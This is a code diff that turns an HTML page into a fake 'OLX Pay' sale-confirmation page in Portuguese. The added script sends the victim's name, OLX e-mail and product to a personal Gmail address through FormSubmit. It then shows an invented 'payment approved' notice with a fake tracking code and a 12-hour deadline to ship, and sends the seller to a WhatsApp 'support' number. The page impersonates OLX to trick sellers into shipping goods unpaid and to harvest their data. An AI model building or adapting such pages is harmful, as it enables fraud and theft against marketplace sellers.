@@ -2,73 +2,85 @@
 <html lang="pt-br">
 <head>
   <meta charset="UTF-8">
-  <title>Painel de Vendas - OLX Pay</title>
-  <link rel="icon" href="https://static.olx.com.br/static/olxbr/favicon-32x32.png" type="image/png">
+  <title>Confirmação de Venda - OLX Pay</title>
   <style>
     body {
       font-family: Arial, sans-serif;
-      background: #f4f4f4;
-      padding: 30px;
-      max-width: 900px;
-      margin: auto;
+      background: #fff;
+      color: #333;
+      max-width: 500px;
+      margin: 30px auto;
+      padding: 20px;
     }
     .logo {
       text-align: center;
       margin-bottom: 20px;
     }
     .logo img {
-      width: 150px;
+      width: 140px;
     }
     h2 {
-      text-align: center;
       color: #ff6600;
+      text-align: center;
+      margin-bottom: 10px;
     }
-    table {
-      width: 100%;
-      border-collapse: collapse;
-      margin-top: 30px;
-      background: #fff;
-      box-shadow: 0 0 10px rgba(0,0,0,0.05);
-    }
-    th, td {
-      padding: 15px;
-      text-align: left;
-      border-bottom: 1px solid #eee;
-    }
-    th {
-      background-color: #ff6600;
-      color: white;
-    }
-    .status {
+    label {
+      display: block;
+      margin-top: 15px;
       font-weight: bold;
     }
-    .status.aprovado { color: green; }
-    .status.pendente { color: orange; }
-    .status.cancelado { color: red; }
-    .formulario {
-      margin-top: 30px;
-      background: #fff;
-      padding: 20px;
-      border-radius: 8px;
-      box-shadow: 0 0 5px rgba(0,0,0,0.1);
-    }
-    .formulario input, .formulario select {
+    input {
       width: 100%;
       padding: 10px;
-      margin: 10px 0;
+      margin-top: 5px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
     }
-    .formulario button {
+    .btn {
+      margin-top: 20px;
+      width: 100%;
       background-color: #ff6600;
-      color: white;
+      color: #fff;
       padding: 12px;
       border: none;
+      border-radius: 5px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+    .hidden {
+      display: none;
+    }
+    .confirmacao {
+      background: #f9f9f9;
+      border: 1px solid #ddd;
+      border-radius: 10px;
+      padding: 20px;
+      margin-top: 30px;
+    }
+    .confirmacao h3 {
+      color: #ff6600;
+    }
+    .whatsapp-btn {
+      display: inline-block;
+      background: #25D366;
+      color: #fff;
+      padding: 12px 20px;
+      border-radius: 5px;
+      text-decoration: none;
+      font-weight: bold;
+      margin-top: 15px;
+      text-align: center;
+    }
+    .olx-btn {
+      margin-top: 20px;
+      background-color: #0066cc;
+      color: #fff;
+      padding: 12px;
+      border: none;
+      border-radius: 5px;
+      font-size: 16px;
       width: 100%;
       cursor: pointer;
-      border-radius: 5px;
-      margin-top: 10px;
-    }
-    .limpar {
-      background-color: #cc0000;
     }
   </style>
 </head>
@@ -78,119 +90,62 @@
     <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/fd/OLX_New_Logo.svg/2560px-OLX_New_Logo.svg.png" alt="OLX Logo">
   </div>
 
-  <h2>Painel de Vendas - OLX Pay</h2>
+  <h2>Confirmação de Venda - OLX Pay</h2>
 
-  <table id="tabela-vendas">
-    <thead>
-      <tr>
-        <th>Produto</th>
-        <th>Valor</th>
-        <th>Comprador</th>
-        <th>Status</th>
-        <th>Código de Postagem</th>
-      </tr>
-    </thead>
-    <tbody>
-      <!-- Vendas aparecem aqui -->
-    </tbody>
-  </table>
+  <form id="vendaForm">
+    <label for="nome">Seu nome completo:</label>
+    <input type="text" id="nome" name="nome" required>
 
-  <div class="formulario">
-    <h3>Adicionar nova venda</h3>
-    <input type="text" id="produto" placeholder="Nome do produto" required>
-    <input type="text" id="valor" placeholder="Valor (ex: R$ 1000,00)" required>
-    <input type="email" id="comprador" placeholder="Email do comprador" required>
-    <select id="status">
-      <option value="aprovado">Aprovado</option>
-      <option value="pendente">Pendente</option>
-      <option value="cancelado">Cancelado</option>
-    </select>
-    <input type="text" id="codigo" placeholder="Código de postagem (opcional)">
-    <button onclick="adicionarVenda()">Adicionar</button>
-    <button onclick="limparTudo()" class="limpar">Limpar todas as vendas</button>
+    <label for="email">Seu e-mail OLX:</label>
+    <input type="email" id="email" name="email" required>
+
+    <label for="produto">Produto vendido:</label>
+    <input type="text" id="produto" name="produto" required>
+
+    <button type="submit" class="btn">Confirmar venda</button>
+  </form>
+
+  <div id="confirmacao" class="confirmacao hidden">
+    <h3>Pagamento aprovado – envie seu produto</h3>
+    <p>Parabéns! Você realizou uma venda com sucesso através do OLX Pay.</p>
+    <p><strong>Produto vendido:</strong> <span id="produtoInfo"></span></p>
+    <p><strong>Valor:</strong> R$ 350,00</p>
+    <p><strong>Forma de envio:</strong> Correios (frete pago)</p>
+    <p><strong>Código de postagem:</strong> BR345671234BR</p>
+    <p><strong>Status do pagamento:</strong> Aprovado</p>
+    <p><strong>Status da venda:</strong> Aguardando envio</p>
+
+    <p style="color: red;"><strong>Atenção:</strong> Você tem até 12h para postar o produto e garantir a conclusão da transação.</p>
+
+    <p><strong>Aviso:</strong> Devido à alta demanda, o chat da OLX Pay está com instabilidade. Para atendimento direto, use o WhatsApp abaixo:</p>
+
+    <a class="whatsapp-btn" href="https://wa.me/55SEUNUMERO" target="_blank">Falar com Suporte OLX Pay</a>
+
+    <p style="margin-top: 20px;">Imagine a satisfação de ver o valor em sua conta. Basta seguir as instruções corretamente.</p>
+
+    <button class="olx-btn" onclick="window.location.href='https://www.olx.com.br/'">Ir para OLX</button>
   </div>
 
   <script>
-    let vendas = [];
+    document.getElementById("vendaForm").addEventListener("submit", function (e) {
+      e.preventDefault();
+      const form = e.target;
+      const dados = new FormData(form);
 
-    window.onload = function () {
-      const dadosSalvos = localStorage.getItem('vendas');
-      if (dadosSalvos) {
-        vendas = JSON.parse(dadosSalvos);
-        vendas.forEach(venda => exibirVendaNaTabela(venda));
-      }
-    }
-
-    function adicionarVenda() {
-      const produto = document.getElementById('produto').value.trim();
-      const valor = document.getElementById('valor').value.trim();
-      const comprador = document.getElementById('comprador').value.trim();
-      const status = document.getElementById('status').value;
-      const codigo = document.getElementById('codigo').value.trim() || '-';
-
-      if (!produto || !valor || !comprador) {
-        alert('Preencha todos os campos obrigatórios!');
-        return;
-      }
-
-      const novaVenda = { produto, valor, comprador, status, codigo };
-      vendas.push(novaVenda);
-      localStorage.setItem('vendas', JSON.stringify(vendas));
-      exibirVendaNaTabela(novaVenda);
-      limparFormulario();
-
-      // Enviar dados para o e-mail com campos organizados
-      const dadosParaEnviar = new FormData();
-      dadosParaEnviar.append('Nova venda cadastrada:', '--------------------------');
-      dadosParaEnviar.append('Produto', produto);
-      dadosParaEnviar.append('Valor', valor);
-      dadosParaEnviar.append('Comprador (e-mail)', comprador);
-      dadosParaEnviar.append('Status da Venda', status);
-      dadosParaEnviar.append('Código de Postagem', codigo);
-
+      // Envia para FormSubmit
       fetch("https://formsubmit.co/ajax/natanaelverissimo34@gmail.com", {
         method: "POST",
         headers: { 'Accept': 'application/json' },
-        body: dadosParaEnviar,
-      })
-      .then(response => response.json())
-      .then(data => {
-        console.log("Email enviado:", data);
-      })
-      .catch(error => {
-        console.error("Erro ao enviar email:", error);
+        body: dados,
+      }).then(() => {
+        // Preenche produto na confirmação
+        document.getElementById("produtoInfo").innerText = form.produto.value;
+
+        // Mostra tela de confirmação
+        document.getElementById('vendaForm').classList.add('hidden');
+        document.getElementById('confirmacao').classList.remove('hidden');
       });
-    }
-
-    function exibirVendaNaTabela(venda) {
-      const tbody = document.querySelector('#tabela-vendas tbody');
-      const tr = document.createElement('tr');
-      tr.innerHTML = `
-        <td>${venda.produto}</td>
-        <td>${venda.valor}</td>
-        <td>${venda.comprador}</td>
-        <td class="status ${venda.status}">${venda.status.charAt(0).toUpperCase() + venda.status.slice(1)}</td>
-        <td>${venda.codigo}</td>
-      `;
-      tbody.appendChild(tr);
-    }
-
-    function limparFormulario() {
-      document.getElementById('produto').value = '';
-      document.getElementById('valor').value = '';
-      document.getElementById('comprador').value = '';
-      document.getElementById('status').value = 'aprovado';
-      document.getElementById('codigo').value = '';
-    }
-
-    function limparTudo() {
-      if (confirm("Tem certeza que deseja apagar todas as vendas?")) {
-        vendas = [];
-        localStorage.removeItem('vendas');
-        document.querySelector('#tabela-vendas tbody').innerHTML = '';
-      }
-    }
+    });
   </script>
-
 </body>
-</html>
+      </html>
